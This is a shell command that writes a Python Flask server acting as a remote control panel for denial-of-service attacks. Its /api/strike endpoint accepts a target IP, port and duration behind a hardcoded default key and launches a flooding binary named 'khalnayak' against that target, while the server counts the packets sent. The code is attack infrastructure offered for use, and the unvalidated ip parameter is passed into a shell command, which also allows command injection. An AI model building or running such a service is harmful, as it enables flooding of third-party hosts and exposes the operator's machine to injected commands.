cat > server.py << 'EOF'
from flask import Flask, request, jsonify
import subprocess
import os
import threading
import time
import signal

app = Flask(__name__)

# Auth Keys
API_KEY = os.environ.get('API_KEY', 'BHAG_BHOSDIKE_2024')

# Attack counter
attack_count = 0
total_packets = 0

def run_attack(ip, port, duration):
    global attack_count, total_packets
    attack_count += 1
    attack_id = attack_count
    
    print(f"\n{'='*50}")
    print(f"[ATTACK #{attack_id}] Target: {ip}:{port}")
    print(f"[ATTACK #{attack_id}] Duration: {duration}s")
    print(f"{'='*50}\n")
    
    try:
        cmd = f"./khalnayak {ip} {port} {duration}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Read output in real-time
        for line in process.stdout:
            print(f"[BINARY] {line.strip()}")
            if "Packets Sent" in line:
                pkts = line.split(":")[-1].strip()
                if pkts.isdigit():
                    total_packets += int(pkts)
        
        process.wait()
        print(f"\n[ATTACK #{attack_id}] Completed!")
        
    except Exception as e:
        print(f"[ERROR] {str(e)}")

@app.route('/')
def home():
    return jsonify({
        "status": "🔥 DANGER MODE API ACTIVE",
        "version": "1.0",
        "endpoints": ["/api/strike", "/api/health", "/api/stats"]
    })

@app.route('/api/strike', methods=['GET'])
def strike():
    key = request.args.get('key')
    
    if key != API_KEY:
        print(f"[UNAUTHORIZED] Attempt from {request.remote_addr}")
        return jsonify({"error": "Invalid API Key"}), 403
    
    ip = request.args.get('ip')
    port = request.args.get('port')
    duration = request.args.get('time', "60")
    
    if not ip or not port:
        return jsonify({"error": "Missing ip or port"}), 400
    
    if not port.isdigit() or not duration.isdigit():
        return jsonify({"error": "Invalid port or time"}), 400
    
    print(f"\n🎯 NEW ATTACK ORDER!")
    print(f"📡 From: {request.remote_addr}")
    print(f"📍 Target: {ip}:{port}")
    print(f"⏱️ Duration: {duration}s\n")
    
    # Start attack thread
    thread = threading.Thread(target=run_attack, args=(ip, int(port), int(duration)))
    thread.start()
    
    return jsonify({
        "success": True,
        "message": "🔥 DANGER ATTACK STARTED!",
        "target": ip,
        "port": port,
        "duration": duration,
        "attack_id": attack_count + 1
    })

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "alive",
        "mode": "DANGER",
        "attacks": attack_count,
        "packets": total_packets
    })

@app.route('/api/stats', methods=['GET'])
def stats():
    key = request.args.get('key')
    if key != API_KEY:
        return jsonify({"error": "Unauthorized"}), 403
    
    return jsonify({
        "total_attacks": attack_count,
        "total_packets": total_packets,
        "status": "active"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print("\n" + "="*60)
    print("🔥 DANGER MODE API - READY TO STRIKE!")
    print(f"📡 Port: {port}")
    print(f"🔑 API Key: {API_KEY}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
EOF
